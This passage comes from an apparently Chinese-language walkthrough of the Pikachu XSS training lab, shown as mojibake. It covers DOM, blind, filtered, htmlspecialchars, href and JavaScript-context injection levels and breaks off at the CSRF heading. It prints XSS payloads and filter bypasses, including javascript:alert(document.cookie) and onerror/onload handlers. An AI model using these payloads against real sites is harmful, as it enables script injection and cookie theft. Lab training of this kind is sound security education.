<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621846.png)



æˆ‘ä»¬çš„è¾“å…¥å˜æˆäº†ï¼š`<font style="color:rgb(0, 0, 0);"><script>alert(</font>`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635522.png)

è¯´æ˜è¿™é‡Œçš„æºç è¿›è¡Œäº†æ‹¦æˆªï¼ŒF12 çœ‹çœ‹å¦‚ä½•ç»•è¿‡é—­åˆ



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631814.png)



åˆ†æä¸€ä¸‹ï¼š

```javascript
è¾“å…¥ï¼š
<script>alert('dom')</script>

æµè§ˆå™¨è§£æï¼š
<a href="<script>alert(" dom')< script>'>what do you see?</a>
```

`<a href="...">` æµè§ˆå™¨ä¼šæŠŠå®ƒå½“æˆé“¾æ¥åœ°å€  



æµè§ˆå™¨å¦‚ä½•é€å­—ç¬¦è§£æçš„ï¼Ÿ

**1ï¸âƒ£**** è§£æ **`**<a href="**`

æµè§ˆå™¨çŠ¶æ€ï¼š

+ è¿›å…¥ **a æ ‡ç­¾**
+ è¿›å…¥ **href å±æ€§**
+ å±æ€§å€¼ä½¿ç”¨ **åŒå¼•å·åŒ…è£¹**

****

**2ï¸âƒ£**** è¯»å–å±æ€§å€¼å†…å®¹**

`**<script>alert(**`

+ åœ¨ **å±æ€§å€¼ä¸­**ï¼š
    - `<script>` åªæ˜¯å­—ç¬¦ä¸²
    - **ä¸ä¼šè¢«å½“æˆ script æ ‡ç­¾**
    - JS ä¸ä¼šæ‰§è¡Œ

æ­¤æ—¶æµè§ˆå™¨è®¤ä¸ºï¼š

`href="<script>alert(`



**3ï¸âƒ£**** å•å¼•å·å˜æˆåŒå¼•å·ï¼Œæå‰ç»“æŸ**

```plain
<script>alert(" dom')
              â†‘
```

è¿™ä¸ª `"`**ç›´æ¥ç»ˆæ­¢äº† href çš„å±æ€§å€¼**

æµè§ˆå™¨ç†è§£ä¸ºï¼š

`<a href="<script>alert(">`



å‰©ä½™ä»£ç ï¼š æ²¡æœ‰å½¢æˆä»»ä½• script æ‰§è¡Œç¯å¢ƒ  

```plain
dom')< script>'>what do you see?</a>
```



æœ€ç»ˆçš„ DOM ç»“æ„ï¼š

```javascript
<a href="<script>alert("> 
    what do you see?
</a>
```

+ `href` åªæ˜¯ä¸€ä¸ª**æ— æ„ä¹‰å­—ç¬¦ä¸²**
+ ç‚¹å‡»é“¾æ¥ä¸ä¼šæ‰§è¡Œ JS
+ ä¸ä¼šå¼¹çª—





çŸ¥é“äº†å®ƒçš„é—­åˆæ–¹å¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œç»•è¿‡ï¼š** å”¯ä¸€ç›®æ ‡ï¼šè·³å‡º href å±æ€§ï¼Œåˆ¶é€ æ–°çš„â€œå¯æ‰§è¡Œç‚¹â€  **

é¦–å…ˆè¦é—­åˆ `href` ï¼Œç»•è¿‡å•å¼•å·ï¼Œç„¶åè¡¥é½åé¢çš„ `</a>` æ ‡ç­¾ï¼Œæœ€åæŠŠåç»­çš„ä¸€äº›å¤šä½™çš„è¯­å¥æ³¨é‡Šæ‰



### payloadï¼š


**1ã€javascript åè®®:**`**javascript:alert(1)**`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629337.png)

**2ã€**`**'> <img src="" onerror=alert('dom')>**`

****

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628241.png)

****

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622315.png)



## 2.5 DOMå‹xss-X


ä¸ä¸Šä¸€å…³ä¸€æ ·ï¼š

åŒºåˆ«åœ¨äºæœ¬å…³æ˜¯ä» url ä¸­è·å–å‚æ•°



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627477.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619222.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620419.png)





payload ä¹Ÿä¸€æ ·ï¼š



### payloadï¼š


**1ã€javascript åè®®:**`**javascript:alert(1)**`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636183.png)

**2ã€**`**'> <img src="" onerror=alert('dom')>**`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616977.png)



## 2.6 Xssä¹‹ç›²æ‰“
é¡¾åæ€ä¹‰ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯æ˜¯çœ‹ä¸åˆ°ä»»ä½•å†…å®¹ï¼Œä¹Ÿä¸å¯èƒ½åœ¨å‰ç«¯å‡ºç°å¼¹çª—ï¼Œæ‰€ä»¥ä»–åªä¼šæäº¤â€œç•™è¨€â€åˆ°åç«¯ï¼Œåç«¯çš„ç®¡ç†å‘˜å¤„æœ‰å¯èƒ½ä¼šæ”¶åˆ° xss æ”»å‡»ã€‚





<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634625.png)



æ ¹æ®æç¤ºï¼Œæœ¬å…³çš„åå°æ˜¯  [http://pikachu:8765/vul/xss/xssblind/admin_login.php](http://pikachu:8765/vul/xss/xssblind/admin_login.php)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634841.png)	

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615127.png)



å¯ä»¥çœ‹åˆ°ç”¨æˆ·ä¼ å…¥çš„æ•°æ®

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619724.png)



å°è¯•å†™å…¥ xssï¼š

ä¿©ä¸ªè¾“å…¥æ¡†éƒ½è¯•ä¸€ä¸‹ï¼š`<script>alert('xss')</script>`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051633583.gif)









## 2.7 Xssä¹‹è¿‡æ»¤


éšä¾¿ä¼ å…¥æµ‹è¯•ä¸€ä¸‹ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628643.png)



ä¼ å…¥ `<script>alert(1)</script>` ï¼Œå‘ç°åªå‰©ä¸‹ `<`äº†ï¼Œé‚£è¿™é‡Œåº”è¯¥æ˜¯è¿‡æ»¤äº† `script`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630687.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615889.png)



ç»•è¿‡æ–¹å¼æœ‰å¾ˆå¤šï¼š

**payloadï¼š**

```plain
//å¤§å°å†™æ··åˆç»•è¿‡
<ScRipt>alert(1)</sCRipT>

//ä¸ä½¿ç”¨ script
<img src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<body onload=alert(1)>
<svg onload=alert(1)>
<a href="" onclick="alert('xss')">
```



å½“ç„¶ï¼Œå…·ä½“æ€ä¹ˆç»•è¿‡è¿˜æ˜¯è¦çœ‹ä»£ç æ€ä¹ˆå†™ï¼Œç»“åˆå…·ä½“æƒ…å†µå»åˆ†æã€‚



## 2.8 xssä¹‹htmIspecialchars
> ## <font style="color:#080808;background-color:#ffffff;">htmlspecialchars</font>
> [https://www.php.net/manual/zh/function.htmlspecialchars.php](https://www.php.net/manual/zh/function.htmlspecialchars.php)
>
> tmlspecialchars â€” å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“
>
> ### è¯´æ˜

```php
htmlspecialchars(
  string $string,
  int $flags = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401,
  ?string $encoding = null,
  bool $double_encode = true
): string
```

> æŸç±»å­—ç¬¦åœ¨ HTML ä¸­æœ‰ç‰¹æ®Šç”¨å¤„ï¼Œå¦‚éœ€ä¿æŒåŸæ„ï¼Œéœ€è¦ç”¨ HTML å®ä½“æ¥è¡¨è¾¾ã€‚ æœ¬å‡½æ•°ä¼šè¿”å›å­—ç¬¦è½¬ä¹‰åçš„è¡¨è¾¾ã€‚ å¦‚éœ€è½¬æ¢å­å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å…³è”çš„åç§°å®ä½“ï¼Œä½¿ç”¨ [htmlentities()](https://www.php.net/manual/zh/function.htmlentities.php) ä»£æ›¿æœ¬å‡½æ•°ã€‚
>
> å¦‚æœä¼ å…¥å­—ç¬¦çš„å­—ç¬¦ç¼–ç å’Œæœ€ç»ˆçš„æ–‡æ¡£æ˜¯ä¸€è‡´çš„ï¼Œåˆ™ç”¨å‡½æ•°å¤„ç†çš„è¾“å…¥é€‚åˆç»å¤§å¤šæ•° HTML æ–‡æ¡£ç¯å¢ƒã€‚ ç„¶è€Œï¼Œå¦‚æœè¾“å…¥çš„å­—ç¬¦ç¼–ç å’Œæœ€ç»ˆåŒ…å«å­—ç¬¦çš„æ–‡æ¡£æ˜¯ä¸ä¸€æ ·çš„ï¼Œ æƒ³è¦ä¿ç•™å­—ç¬¦ï¼ˆä»¥æ•°å­—æˆ–åç§°å®ä½“çš„å½¢å¼ï¼‰ï¼Œæœ¬å‡½æ•°ä»¥åŠ [htmlentities()](https://www.php.net/manual/zh/function.htmlentities.php) ï¼ˆä»…ç¼–ç åç§°å®ä½“å¯¹åº”çš„å­å­—ç¬¦ä¸²ï¼‰å¯èƒ½ä¸å¤Ÿç”¨ã€‚ è¿™ç§æƒ…å†µå¯ä»¥ä½¿ç”¨ [mb_encode_numericentity()](https://www.php.net/manual/zh/function.mb-encode-numericentity.php) ä»£æ›¿ã€‚
>

| <font style="color:rgb(51, 51, 51);">å­—ç¬¦</font> | <font style="color:rgb(51, 51, 51);">æ›¿æ¢å</font> |
| --- | --- |
| `<font style="color:rgb(51, 51, 51);">&</font>`<font style="color:rgb(51, 51, 51);">(& ç¬¦å·)</font> | `<font style="color:rgb(51, 51, 51);">&amp;</font>` |
| `<font style="color:rgb(51, 51, 51);">"</font>`<font style="color:rgb(51, 51, 51);">(åŒå¼•å·)</font> | `<font style="color:rgb(51, 51, 51);">&quot;</font>`<font style="color:rgb(51, 51, 51);">ï¼Œé™¤éè®¾ç½®äº† </font>`[**<font style="color:rgb(51, 102, 153);">ENT_NOQUOTES</font>**](https://www.php.net/manual/zh/string.constants.php#constant.ent-noquotes)` |
| `<font style="color:rgb(51, 51, 51);">'</font>`<font style="color:rgb(51, 51, 51);">(å•å¼•å·)</font> | <font style="color:rgb(51, 51, 51);">è®¾ç½®äº† </font>`[**<font style="color:rgb(51, 102, 153);">ENT_QUOTES</font>**](https://www.php.net/manual/zh/string.constants.php#constant.ent-quotes)`<font style="color:rgb(51, 51, 51);">åï¼Œ </font>`<font style="color:rgb(51, 51, 51);">&#039;</font>`<font style="color:rgb(51, 51, 51);">(å¦‚æœæ˜¯ </font>`[**<font style="color:rgb(51, 102, 153);">ENT_HTML401</font>**](https://www.php.net/manual/zh/string.constants.php#constant.ent-html401)`<font style="color:rgb(51, 51, 51);">) ï¼Œæˆ–è€… </font>`<font style="color:rgb(51, 51, 51);">&apos;</font>`<font style="color:rgb(51, 51, 51);"> (å¦‚æœæ˜¯ </font>`[**<font style="color:rgb(51, 102, 153);">ENT_XML1</font>**](https://www.php.net/manual/zh/string.constants.php#constant.ent-xml1)`<font style="color:rgb(51, 51, 51);">ã€ </font>`[**<font style="color:rgb(51, 102, 153);">ENT_XHTML</font>**](https://www.php.net/manual/zh/string.constants.php#constant.ent-xhtml)`<font style="color:rgb(51, 51, 51);"> æˆ– </font>`[**<font style="color:rgb(51, 102, 153);">ENT_HTML5</font>**](https://www.php.net/manual/zh/string.constants.php#constant.ent-html5)`<font style="color:rgb(51, 51, 51);">)ã€‚</font> |
| `<font style="color:rgb(51, 51, 51);"><</font>`<font style="color:rgb(51, 51, 51);">(å°äº)</font> | `<font style="color:rgb(51, 51, 51);">&lt;</font>` |
| `<font style="color:rgb(51, 51, 51);">></font>`<font style="color:rgb(51, 51, 51);">(å¤§äº)</font> | `<font style="color:rgb(51, 51, 51);">&gt;</font>` |




æœ¬å…³æ ¹æ®é¢˜ç›®ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šè¿‡æ»¤äº† `& < >` è¿™äº›å­—ç¬¦ï¼Œ`" '`è¿™ä¿©ä¸ªè¿˜ä¸ç¡®å®šï¼Œå¦‚æœæºç ä¸­è®¾ç½®äº† `ENT_NOQUOTES`å’Œ `ENT_QUOTES`ç­‰ï¼Œå°±ä¼šè¢«è¿‡æ»¤ã€‚



æˆ‘ä»¬å‘ç°è¾“å…¥çš„å†…å®¹å˜æˆäº†ä¸€ä¸ªé“¾æ¥

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636393.png)



å°è¯•é—­åˆ `<a>`æ ‡ç­¾ï¼š

`' onclick='alert("xss")'`

æˆåŠŸé—­åˆäº† `<a>`æ ‡ç­¾ã€‚ä¹Ÿå°±æ˜¯è¯´** **`**' "**`**æ²¡æœ‰è¢«è¿‡æ»¤**

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622188.png)



é‚£ä¹ˆå¯ä»¥æ„é€ è¿™æ ·çš„ payloadï¼š

```php
' onclick='alert("xss")'  
javascript:alert("xss") 
```

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635582.png)





## 2.9 Xssä¹‹hrefè¾“å‡º
> # <font style="color:rgb(0, 0, 0);">HTML <a> hrefå±æ€§</font>
> [https://www.w3school.com.cn/tags/att_a_href.asp](https://www.w3school.com.cn/tags/att_a_href.asp)
>
> ## <font style="color:rgb(0, 0, 0);">å®šä¹‰å’Œç”¨æ³•</font>
> `<font style="color:crimson;background-color:rgba(222, 222, 222, 0.3);">href</font>`<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> </font><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">å±æ€§è§„å®šé“¾æ¥æŒ‡å‘çš„é¡µé¢çš„ URLã€‚</font>
>
> `<font style="color:crimson;background-color:rgba(222, 222, 222, 0.3);">href</font>`<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> </font><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">å±æ€§çš„å€¼å¯ä»¥æ˜¯ä»»ä½•æœ‰æ•ˆæ–‡æ¡£çš„ç›¸å¯¹æˆ–ç»å¯¹ URLï¼ŒåŒ…æ‹¬ç‰‡æ®µæ ‡è¯†ç¬¦å’Œ JavaScript ä»£ç æ®µã€‚å¦‚æœç”¨æˆ·é€‰æ‹©äº† <a> æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå°è¯•æ£€ç´¢å¹¶æ˜¾ç¤º</font><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> </font>`<font style="color:crimson;background-color:rgba(222, 222, 222, 0.3);">href</font>`<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> </font><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">å±æ€§æŒ‡å®šçš„ URL æ‰€è¡¨ç¤ºçš„æ–‡æ¡£ï¼Œæˆ–è€…æ‰§è¡Œ JavaScript è¡¨è¾¾å¼ã€æ–¹æ³•å’Œå‡½æ•°çš„åˆ—è¡¨ã€‚</font>
>
> <font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">å¦‚æœ</font><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> </font>`<font style="color:crimson;background-color:rgba(222, 222, 222, 0.3);">href</font>`<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> </font><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">å±æ€§ä¸å­˜åœ¨ï¼Œåˆ™ <a> æ ‡ç­¾å°†ä¸æ˜¯è¶…é“¾æ¥ã€‚</font>
>
> **<font style="color:rgb(255, 153, 85);background-color:rgb(253, 252, 248);">æç¤ºï¼š</font>**<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">æ‚¨å¯ä»¥ä½¿ç”¨ href="#top" æˆ– href="#" é“¾æ¥åˆ°å½“å‰é¡µé¢çš„é¡¶éƒ¨ï¼</font>
>
> ## åˆ¶ä½œæ–‡æœ¬é“¾æ¥
> <font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">ä¸€ä¸ªå¼•ç”¨å…¶ä»–æ–‡æ¡£çš„ç®€å• <a> æ ‡ç­¾å¯ä»¥æ˜¯ä¸‹åˆ—å½¢å¼ï¼š</font>
>
> `<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"><a href="</font>[http://www.w3school.com.cn/index.html">W3School](http://www.w3school.com.cn/index.html">W3School)<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> åœ¨çº¿æ•™ç¨‹</a></font>`
>
> <font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">æµè§ˆå™¨ç”¨ç‰¹æ®Šæ•ˆæœæ˜¾ç¤ºçŸ­è¯­â€œW3School åœ¨çº¿æ•™ç¨‹â€ï¼ˆé€šå¸¸æ˜¯å¸¦ä¸‹åˆ’çº¿çš„è“è‰²æ–‡æœ¬ï¼‰ï¼Œè¿™æ ·ç”¨æˆ·å°±ä¼šçŸ¥é“å®ƒæ˜¯ä¸€ä¸ªå¯ä»¥é“¾æ¥åˆ°å…¶ä»–æ–‡æ¡£çš„è¶…é“¾æ¥ã€‚å°±åƒè¿™æ ·ï¼š</font>
>
> [<font style="color:rgb(0, 0, 255);background-color:rgb(253, 252, 248);">W3School åœ¨çº¿æ•™ç¨‹</font>](http://www.w3school.com.cn/index.html)
>
> <font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">ç”¨æˆ·è¿˜å¯ä»¥åˆ©ç”¨æµè§ˆå™¨ä¸­çš„é€‰é¡¹æ¥è‡ªå·±æŒ‡å®šæ–‡æœ¬é¢œè‰²ã€è®¾ç½®é“¾æ¥å‰å’Œé“¾æ¥åé“¾æ¥æ–‡æœ¬çš„é¢œè‰²ã€‚</font>
>
> **<font style="color:rgb(255, 153, 85);background-color:rgb(253, 252, 248);">æç¤ºï¼š</font>**<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">å¯ä»¥ä½¿ç”¨</font><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> </font>[<font style="color:rgb(144, 11, 9);background-color:rgb(253, 252, 248);">CSS ä¼ªç±»</font>](https://www.w3school.com.cn/css/css_pseudo_classes.asp)<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">å‘æ–‡æœ¬è¶…é“¾æ¥æ·»åŠ å¤æ‚è€Œå¤šæ ·çš„æ ·å¼ã€‚</font>
>
> ## åˆ¶ä½œå›¾åƒé“¾æ¥
> <font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">æ›´å¤æ‚çš„é”šè¿˜å¯ä»¥åŒ…å«å›¾åƒã€‚ä¸‹é¢è¿™ä¸ª LOGO æ˜¯ä¸€ä¸ªå›¾åƒé“¾æ¥ï¼Œç‚¹å‡»è¯¥å›¾åƒï¼Œå¯ä»¥è¿”å› W3school çš„é¦–é¡µï¼š</font>
>

```html
<a href="http://www.w3school.com.cn/index.html">
  <img src="/i/w3school_logo_white.gif" />
</a>
```

> <font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">ä¸Šé¢çš„ä»£ç ä¼šä¸º W3School çš„ LOGO æ·»åŠ ä¸€ä¸ªè¿”å›é¦–é¡µçš„è¶…é“¾æ¥ï¼š</font>
>
> <!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620990.gif)
>
> <font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">å¤§å¤šæ•°å›¾å½¢æµè§ˆå™¨éƒ½ä¼šåœ¨ä½œä¸ºé”šçš„ä¸€éƒ¨åˆ†çš„å›¾åƒå‘¨å›´æ”¾ç½®ç‰¹æ®Šçš„è¾¹æ¡†ã€‚é€šè¿‡åœ¨ <img> æ ‡ç­¾ä¸­æŠŠå›¾åƒçš„ </font>[<font style="color:rgb(144, 11, 9);background-color:rgb(253, 252, 248);">border å±æ€§</font>](https://www.w3school.com.cn/tags/att_img_border.asp)<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">è®¾ç½®ä¸º 0 å¯ä»¥åˆ é™¤è¶…é“¾æ¥çš„è¾¹æ¡†ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ </font>[<font style="color:rgb(144, 11, 9);background-color:rgb(253, 252, 248);">CSS çš„è¾¹æ¡†å±æ€§</font>](https://www.w3school.com.cn/css/css_border.asp)<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">æ¥å…¨å±€æ€§åœ°æ”¹å˜å…ƒç´ çš„è¾¹æ¡†æ ·å¼ã€‚</font>
>
> ### <font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">å±æ€§å€¼</font>

| <font style="color:rgb(255, 255, 255);">å€¼</font> | <font style="color:rgb(255, 255, 255);">æè¿°</font> |
| :--- | :--- |
| _<font style="color:rgb(0, 0, 0);">URL</font>_ | <font style="color:rgb(0, 0, 0);">é“¾æ¥çš„ URLã€‚</font><br/><font style="color:rgb(0, 0, 0);">å¯èƒ½çš„å€¼ï¼š</font><br/>+ <font style="color:rgb(0, 0, 0);">ç»å¯¹ URL - æŒ‡å‘å¦ä¸€ä¸ªç½‘ç«™ï¼ˆæ¯”å¦‚href="http://www.example.com/index.html"ï¼‰</font><br/>+ <font style="color:rgb(0, 0, 0);">ç›¸å¯¹ URL - æŒ‡å‘ç½‘ç«™å†…çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚ href="index.html"ï¼‰</font><br/>+ <font style="color:rgb(0, 0, 0);">é“¾æ¥åˆ°é¡µé¢ä¸­å¸¦æœ‰æŒ‡å®š id çš„å…ƒç´ ï¼ˆæ¯”å¦‚ href="#section2"ï¼‰</font><br/>+ <font style="color:rgb(0, 0, 0);">å…¶ä»–åè®®ï¼ˆæ¯”å¦‚ https://ã€ftp://ã€mailto:ã€file: ç­‰ï¼‰</font><br/>+ <font style="color:rgb(0, 0, 0);">è„šæœ¬ï¼ˆæ¯”å¦‚ href="javascript:alert('Hello');"ï¼‰</font> |








ç›´æ¥è¾“å…¥ç½‘å€ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051633550.png)



è¾“å…¥å…¶ä»–å†…å®¹ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629927.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628433.png)















<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615302.png)





ç»•è¿‡åŸç†ï¼Œåˆ©ç”¨çš„æ˜¯ href  çš„å±æ€§ï¼š

> `**<font style="color:crimson;background-color:rgba(222, 222, 222, 0.3);">href</font>**`**<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> å±æ€§çš„å€¼å¯ä»¥æ˜¯ä»»ä½•æœ‰æ•ˆæ–‡æ¡£çš„ç›¸å¯¹æˆ–ç»å¯¹ URLï¼ŒåŒ…æ‹¬ç‰‡æ®µæ ‡è¯†ç¬¦å’Œ JavaScript ä»£ç æ®µã€‚å¦‚æœç”¨æˆ·é€‰æ‹©äº† <a> æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå°è¯•æ£€ç´¢å¹¶æ˜¾ç¤º </font>**`**<font style="color:crimson;background-color:rgba(222, 222, 222, 0.3);">href</font>**`**<font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> å±æ€§æŒ‡å®šçš„ URL æ‰€è¡¨ç¤ºçš„æ–‡æ¡£ï¼Œæˆ–è€…æ‰§è¡Œ JavaScript è¡¨è¾¾å¼ã€æ–¹æ³•å’Œå‡½æ•°çš„åˆ—è¡¨ã€‚</font>**
>



**payload:**

`javascript:alert(document.cookie)`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631615.png)





## 2.10 xssä¹‹jsè¾“å‡º


è¾“å…¥ï¼š123

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634534.png)



å‘ç°è¿™æ˜¯ä¸€æ®µ JS ä»£ç ï¼š

```html
<script>
    $ms='123'; 
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmacç¡®å®å‰å®³,çœ‹é‚£å°çœ¼ç¥..')
        }else {
//            alert($ms);
            $('#fromjs').text('æ— è®ºå¦‚ä½•ä¸è¦æ”¾å¼ƒå¿ƒä¸­æ‰€çˆ±..')
        }
    }
</script>
```



è¾“å…¥è¢«åŠ¨æ€çš„ç”Ÿæˆåˆ°äº† JavaScript ä¸­ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬ç›´æ¥é—­åˆæ‰è¿™æ®µä»£ç ï¼Œè®©ä»–æ‰§è¡Œæˆ‘ä»¬å†™çš„æ–°ä»£ç ï¼š

`</script><script>alert('over')</script>`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625412.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630353.png)



# <font style="color:rgb(57, 57, 57);">3ã€CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )</font>
> **<font style="color:rgb(57, 57, 57);">CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )æ¦‚è¿°</font>**
>
